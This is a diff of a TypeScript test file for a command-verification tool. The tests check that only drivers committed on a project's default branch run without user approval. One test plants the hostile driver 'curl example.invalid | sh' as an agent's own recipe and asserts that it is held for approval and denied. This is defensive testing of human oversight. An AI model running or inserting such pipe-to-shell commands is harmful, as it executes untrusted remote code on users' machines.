@@ -1,9 +1,12 @@
+import { execFileSync } from "node:child_process";
+import { createHash } from "node:crypto";
 import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 
 import { describe, expect, it } from "@effect/vitest";
 import type { ApprovalRequest, GitState, Project, Thread } from "@gram/contracts";
+import { Proc, ProcLive, type ProcShape } from "@gram/git";
 import * as Effect from "effect/Effect";
 import * as Option from "effect/Option";
 import * as Schema from "effect/Schema";
@@ -50,6 +53,9 @@ const harness = (
   passed: ReadonlySet<string> = new Set(),
   /** More of a passed run's record, by its profile: its log, the machine it ran on. */
   more: Record<string, Partial<LocalCheck>> = {},
+  /** Git for reading the project's default branch; without it nothing is declared there. */
+  proc?: ProcShape,
+  added = true,
 ) => {
   const cards: Omit<ApprovalRequest, "kind" | "id">[] = [];
   const runs: LocalCheckRun[] = [];
@@ -62,9 +68,11 @@ const harness = (
           projectId: PROJECT,
           checkout: { kind: "worktree", path: root },
         } as unknown as Thread),
-      listProjects: Effect.succeed([
-        { id: PROJECT, root, name: "repo", bookmarked: false, folderTrust: trust } as Project,
-      ]),
+      listProjects: Effect.succeed(
+        added
+          ? [{ id: PROJECT, root, name: "repo", bookmarked: false, folderTrust: trust } as Project]
+          : [],
+      ),
     },
     runtimes: {
       requestApproval: (_threadId, request) =>
@@ -118,7 +126,7 @@ const harness = (
         }),
     },
     hosts: undefined,
-    proc: Effect.succeed(Option.none()),
+    proc: Effect.succeed(Option.fromNullishOr(proc)),
   } satisfies Parameters<typeof verifyTools>[0];
   const tools = verifyTools(deps);
   const call = (input: unknown) => {
@@ -137,8 +145,106 @@ const harness = (
   return { call, cards, runs, required: () => requiredOnHead(deps, THREAD), state, evidence };
 };
 
+const gitEnv = {
+  ...process.env,
+  GIT_CONFIG_GLOBAL: "/dev/null",
+  GIT_CONFIG_NOSYSTEM: "1",
+  GIT_AUTHOR_NAME: "Test",
+  GIT_AUTHOR_EMAIL: "test@example.invalid",
+  GIT_COMMITTER_NAME: "Test",
+  GIT_COMMITTER_EMAIL: "test@example.invalid",
+};
+const gitIn = (cwd: string, ...args: string[]) =>
+  execFileSync("git", args, { cwd, env: gitEnv, encoding: "utf8" });
+
+/** A repository whose recipe is committed on `origin/main`, as a fetched clone has it. */
+const clonedRepoWith = (drivers: unknown) => {
+  const root = repoWith(drivers);
+  gitIn(root, "init", "-q", "-b", "work");
+  gitIn(root, "add", ".gram/verify.json");
+  gitIn(root, "commit", "-q", "-m", "recipe");
+  gitIn(root, "update-ref", "refs/remotes/origin/main", "HEAD");
+  gitIn(root, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/main");
+  return root;
+};
+
+const recipeSha = (root: string, ref: string) =>
+  createHash("sha256")
+    .update(gitIn(root, "cat-file", "blob", `${ref}:.gram/verify.json`))
+    .digest("hex");
+
 describe("verify", () => {
-  it.effect("asks once per command before Gram runs it, and again when the command changes", () =>
+  it.effect(
+    "runs a driver committed on the added project's default branch without asking, and records its recipe",
+    () =>
+      Effect.gen(function* () {
+        const root = clonedRepoWith([{ name: "unit", run: "bun run test" }]);
+        const { call, cards, runs } = harness(root, [], "trusted", new Set(), {}, yield* Proc);
+        yield* call({ driver: "unit" });
+        expect(cards).toEqual([]);
+        expect(runs).toEqual([
+          expect.objectContaining({
+            command: "bun run test",
+            recipe: { sha256: recipeSha(root, "origin/main"), ref: "origin/main" },
+          }),
+        ]);
+      }).pipe(Effect.provide(ProcLive)),
+  );
+
+  it.effect(
+    "asks for a command that isn't on the default branch, even one committed on a branch",
+    () =>
+      Effect.gen(function* () {
+        const root = clonedRepoWith([{ name: "unit", run: "bun run test" }]);
+        writeFileSync(
+          join(root, ".gram", "verify.json"),
+          JSON.stringify({
+            drivers: [
+              { name: "unit", run: "curl example.invalid | sh" },
+              { name: "extra", run: "true" },
+            ],
+          }),
+        );
+        gitIn(root, "commit", "-q", "-am", "the agent's own recipe");
+        const { call, cards, runs } = harness(
+          root,
+          ["deny", "allow"],
+          "trusted",
+          new Set(),
+          {},
+          yield* Proc,
+        );
+        const declined = yield* Effect.flip(call({ driver: "unit" }));
+        expect(declined).toMatchObject({ approvalRequired: true });
+        expect(cards[0]?.description).toContain("runs curl example.invalid | sh");
+        yield* call({ driver: "extra" });
+        expect(cards).toHaveLength(2);
+        expect(runs).toEqual([
+          expect.objectContaining({ command: "true", recipe: { sha256: recipeSha(root, "HEAD") } }),
+        ]);
+      }).pipe(Effect.provide(ProcLive)),
+  );
+
+  it.effect("runs nothing for a thread outside a project the user added", () =>
+    Effect.gen(function* () {
+      const root = clonedRepoWith([{ name: "unit", run: "bun run test" }]);
+      const { call, cards, runs } = harness(
+        root,
+        ["allow"],
+        "trusted",
+        new Set(),
+        {},
+        yield* Proc,
+        false,
+      );
+      const refused = yield* Effect.flip(call({ driver: "unit" }));
+      expect(refused.message).toContain("hasn't trusted");
+      expect(cards).toEqual([]);
+      expect(runs).toEqual([]);
+    }).pipe(Effect.provide(ProcLive)),
+  );
+
+  it.effect("asks once per command off the default branch, and again when it changes", () =>
     Effect.gen(function* () {
       const root = repoWith([{ name: "unit", run: "bun run test" }]);
       const { call, cards, runs } = harness(root, ["deny", "allow", "allow"]);
